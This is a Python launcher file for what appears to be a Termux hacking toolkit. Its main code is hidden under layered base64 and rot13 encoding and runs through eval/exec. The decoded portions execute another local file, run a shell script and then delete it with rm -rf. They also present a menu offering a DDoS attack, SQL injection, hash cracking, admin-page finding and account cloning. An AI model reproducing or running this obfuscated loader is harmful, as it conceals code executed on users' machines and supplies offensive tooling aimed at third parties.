#######################
#                     #
#        main         # MAIN FILE
#                     #
#####################################
#  Author: Cracker911181 ############
#####################################
#                            #
#   CODER :  CRACKER911181   #
#                            #
##############################
 

# Coded by Cracker
# CRACKER911181
 
 

import base64, codecs
magic = 'CmltcG9ydCBvcyx0aW1lLHN5cyxtYXJzaGFsCgojVGV4dCBjb2xvdXIKI2NyZWF0ZWQgQnkgQ3JhY2tlcjkxMTE4MQpjb2xvdXJvZmY9Ilx4MWJbMDBtIiAjY29sb3VyIG9mZgoKcmVkPSJceDFiWzkxbSIgI3JlZApncmVlbj0iXHgxYls5Mm0iICNncmVlbgp5ZWxsb3c9Ilx4MWJbOTNtIiAjeWVsbG93CmJsdWU9Ilx4MWJbOTRtIiAjYmx1ZQpyb3N5PSJceDFiWzk1bSIgI3Jvc3kKcGVzdD0iXHgxYls5Nm0iICNwZXN0CgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMKCmV4ZWMoKG9wZW4oJ2NudHJsLnB5JywncicpKS5yZWFkKCkpCgpvcy5zeXN0ZW0oInNoIHJlcXVpcmVtZW50LnNoIikKb3Muc3lzdGVtKCJybSAtcmYgcmVxdWlyZW1lbnQuc2giKQpvcy5zeXN0ZW0oInJtIC1yZiBfX3B5Y2FjaGVfXyIpCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMKCiNleGVjKG1hcnNoYWwubG9hZHMoYidceGZhJm9wcD1vcGVuKCJsZy5weSIsInIiKVxuZXhlYyhvcHAucmVhZCgpKScpKQoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgpkZWYgdm9pY2UoKToKCXRleHQ9c3RyKGlucHV0KHJvc3krIlxuRW50ZXIgWW91ciBUZXh0OiAiKSkKCXdoaWxlIFRydWU6CgkJbGFuPXN0cihpbnB1dChyb3N5KyJcbkVudGVyIFlvdXIgTGFuZ3VhZ2UoZXhhbXBsZTogJ2VuL2JuJyk6ICIpKQoJCWlmIGxhbj09IiIgb3IgbGFuPT0iICI6CgkJCXByaW50KHJlZCsiXG5cblx0TGFuZ3VhZ2UgTm90IERlbmllZCIpCgkJZWxzZToKCQkJdm9pY2U9Z1RUUyh0ZXh0PXRleHQsbGFuZz1sYW4pCgkJCWZpbGU9c3RyKGlucHV0KCJcbkVudGVyIFlvdXIgRmlsZSBOYW1lIEZvciBzYXZpbmcoZXhhbXBsZTogdGVzdC5tcDMpOiAiKSkKCQkJd2hpbGUgVHJ1ZToKCQkJCXBhdGg9c3RyKGlucHV0KHJvc3krIlxuRW50ZXIgWW91ciBTYXZpbmcgUGF0aDogIikpCgkJCQlpZiBwYXRoPT0iIiBvciBwYXRoPT0iICI6CgkJCQkJcHJpbnQocmVkKyJcblxuXHRQYXRoIE5vdCBEZW5pZWQiKQoJCQkJZWxzZToKCQkJCQltbnB0PXN0cihwYXRoKyIvIitmaWxlKQoJCQkJCXZvaWNlLnNhdmUobW5wdCkKCgoKCmRlZiB2YygpOgoJd2hpbG'
love = 'HtIUW1MGbXPDyjpzyhqPuvoUIyX2LvVvVXVPNtK19sKlNtVPNtVPNtVPNtVPNtVPOsVPNtVPNtVPNtVPNtVPNtVS9sK19sVPNtVPNtVPNtVPOsPvNtYlOsK198KlOsKlOsKlOsVPOsK198VUjtK19sK18tKlOsKlNtVUksVPNtK3ksKlNtVS9sKlO8VUjXVPVvVvgvoUIyXlVvVajtsPNtVUjtW19sYlOsLPO8YlOsK3jtsP8tYlOsVSjtW19ssS9sK198VUjiVS8tKPNiVS8tKUjtsNbtVvVvX3Oyp3DeVvVvsPO8K19ssPO8VUjtXS98VUjtXS9ssPNtVQjtVS9sYlO8VUksK19sK3jtsPNbKlxtsPNbKlxtsPO8PvNtKS9sK198K3jtVSksKlkssSksK198K3kpK1ksK198K3jtVPNtVPNtsS98KS9sKl8tKS9sKl98K3kpoykhVPVvVvgapzIyovfvVvVtVPNtVPNtVPNtVPNtD3WuL2ftJJ91pvOKo3WfMPjtFJLtJJ91VRAuoykhKT5pqPNtVPNtVPNtVPNtVvVvX2WfqJHeVvVvJ+XLuI0tFINtIT9ioPOo4cvSKFOpovVvVvgapzIyovfvVvVtCG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09VvVvX2AioT91pz9zMvxXPDywnT9mMG1mqUVbnJ5jqKDbpTImqPfvKT5poyk0KUDkYvOQo252MKW0VSEyrUDtIT8tIz9cL2Ipoyk0KUDvX3WyMPfvZQNhDzSwnlOHolOVo21yKT5povVepz9mrFfvEJ50MKVtJJ91pvOCpUEco246VPVcXDbWPtxWnJLtL2uip2H9CFVkVwbXPDxWqz9cL2HbXDbWPJIfnJLtL2uip2H9CFVjZPV6PtxWPJWlMJSePtxWPtbXPtbXVNc3nTyfMFOHpaIyBtbWo3Zhp3ymqTIgXPqwoTIupvpcPtyjpzyhqPuvoUIyX2LvVvVXVPNtK19sKlNtVPNtVPNtVPNtVPNtVPOsVPNtVPNtVPNtVPNtVPNtVS9sK19sVPNtVPNtVPNtVPOsPvNtYlOsK198KlOsKlOsKlOsVPOsK198VUjtK19sK18tKlOsKlNtVUksVPNtK3ksKlNtVS9sKlO8VUjXVPVvVvgvoUIyXlVvVajtsPNtVUjtW19sYlOsLPO8YlOsK3jtsP8tYlOsVSjtW19ssS9sK198VUjiVS8tKPNiVS8tKUjtsNbtVvVvX3Oyp3DeVvVvsPO8K19ssPO8VUjtXS98VUjtXS9ssPNtVQjtVS9sYlO8VUksK19sK3jtsPNbKlxtsPNbKlxtsPO8PvNtKS9sK198K3jtVSksKlkssSksK198K3kp'
god = 'X1xfX198X3wgICAgICAgfF98XF9fXy8gXF9fXy98X3xcblxuICIiIitncmVlbisiIiIgICAgICAgICAgICAgQ3JhY2sgWW91ciBXb3JsZCwgSWYgWW91IENhblxuXG5cdFx0ICAgICAgIiIiK3llbGxvdysiIiJWZXJzaW9uOiIiIityZWQrIiIiMS41IiIiK2NvbG91cm9mZikKCWNob29zZT1zdHIoaW5wdXQocGVzdCsiIiJcbgpcdHw9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PXwKXHR8IiIiK3llbGxvdysiIiIgMS5Db250YWN0IEluZm8iIiIrcGVzdCsiIiIgICAyLklQIFRvb2wgICAgICAgICAgIHwKXHR8IDMuRGRvcyBBdHRhY2sgICAgNC5TdWJkb21haW4gU2Nhbm5lciB8Clx0fCA1LkFkbWluIEZpbmRlciAgIDYuSGFzIENyYWNrZXIgICAgICAgfApcdHwgNy5WaWRlbyBEb3dubG9hZGVyICAgOC5CRCBDbG9uZXIgICAgIHwKXHR8IDkuU1FMLUluamVjdGlvbiAgMTAuVGV4dCBUbyBWb2ljZSAgICB8Clx0fDExLlRlcm11eCBCYW5uZXIgICAgICAgICAgICAgICAgICAgICAgfApcdHwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKXHR8IiIiK2dyZWVuKyIiIiA4OC5VcGRhdGUgQ3JhY2tlci1Ub29sIiIiK3JlZCsiIiIgICAgOTkuRXhpdCIiIitwZXN0KyIiIiAgICB8Clx0fD09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09fApcbiIiIityb3N5KyIiIkVudGVyIFlvdXIgT3B0aW9uOiAiIiIpKQoKCQoJaWYgY2hvb3NlPT0iOTkiOgoJCW9zLnN5c3RlbSgiY2xlYXIiKQoJCXByaW50KHllbGxvdysiXG5cblxuXG5cblxuXHRcdPCfpKlUaGFua3MgRm9yIFVzaW5nIE15IFRvb2zwn6SpICAgXG5cblxuIikKCQlzeXMuZXhpdCgpCgkKCQoJZWxpZiBjaG9vc2U9PSIxIjoKCQlvcy5zeXN0ZW0oJ2NsZWFyJykKCQlwcmludChibHVlK2YiIiJcbgogICAgIHw9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT18CiAgICAgfCAgICAgICAgICAgICAgICAgICBPV05FUiBJTkZPICAgICAgICAgICAgICAgICAgICAgIHwKICAgICB8PT09PT09PT09PT09PT09PT09PT09PT09PT'
destiny = '09CG09CG09CG09CG09CG09CG09CG09CG09sNbtVPNtVUjtEzSwMJWio2ftsPObqUEjpmbiY3q3ql5zLJAyLz9inl5wo20iL3WuL2gypwxkZGR4ZFO8PvNtVPNtsPOHMJkyM3WuoFO8VTu0qUOmBv8iqP5gMF9wpzSwn2IlBGRkZGtkVPNtVPNtVPNtVPNtVUjXVPNtVPO8VRqcqRu1LvNtVUjtnUE0pUZ6Yl9anKEbqJVhL29gY2AlLJAeMKV5ZGRkBQRtVPNtVPNtsNbtVPNtVUj9CG09CG09CG09sQ09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG09CG18PvVvVvxXPDbWPKEcoJHhp2kyMKNbAlxXPDbWMJkcMvOwnT9ip2H9CFVlVwbXPDyiom1ipTIhXPWcpP5jrFVfVaVvXDbWPJI4MJZbo28hpzIuMPtcXDbWPtyyoTyzVTAbo29mMG09VwZvBtbWPJ9iCJ9jMJ4bVzExo3ZhpUxvYPWlVvxXPDyyrTIwXT9iYaWyLJDbXFxXPDbWMJkcMvOwnT9ip2H9CFV0VwbXPDyiom1ipTIhXPWmqJWxoF5jrFVfVaVvXDbWPJI4MJZbo28hpzIuMPtcXDbWPtyyoTyzVTAbo29mMG09VwHvBtbWPJ9iCJ9jMJ4bVzSxoJyhYaO5VvjvpvVcPtxWMKuyLluiol5lMJSxXPxcPtxXPJIfnJLtL2uio3AyCG0vAvV6PtxWo289o3OyovtvnTSmYaO5VvjvpvVcPtxWMKuyLluiol5lMJSxXPxcPtxXPJIfnJLtL2uio3AyCG0vAlV6PtxWo289o3OyovtvMT93ozkxYaO5VvjvpvVcPtxWMKuyLluiol5lMJSxXPxcPtxXPJIfnJLtL2uio3AyCG0vBPV6PtxWo289o3OyovtvL2kiozHhpUxvYPWlVvxXPDyyrTIwXT9iYaWyLJDbXFxXPDbWMJkcMvOwnT9ip2H9CFV5VwbXPDyiom1ipTIhXPWmpJjgoJ4hpUxvYPWlVvxXPDyyrTIwXT9iYaWyLJDbXFxXPDbWMJkcMvOwnT9ip2H9CFVkZPV6PtxWMaWioFOaqUEmVTygpT9lqPOaISEGPtxXPDyipl5mrKA0MJ0bW2AfMJSlWlxXPDy2LltcPtxXPJIfnJLtL2uio3AyCG0vZGRvBtbWPJ9iCJ9jMJ4bVzWhoaWyYaO5VvjvpvVcPtxWMKuyLluiol5lMJSxXPxcPtxXPDbWMJkcMvOwnT9ip2H9CFV4BPV6PtxWo3Zhp3ymqTIgXPqwnT1iMPNerPO1pP5mnPpcPtxWo3Zhp3ymqTIgXPphY3IjYaAbWlxXPDymrKZhMKucqPtcPtyyoTyzVTAbo3AyCG0vZQNvBtbWPJWlMJSe'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))



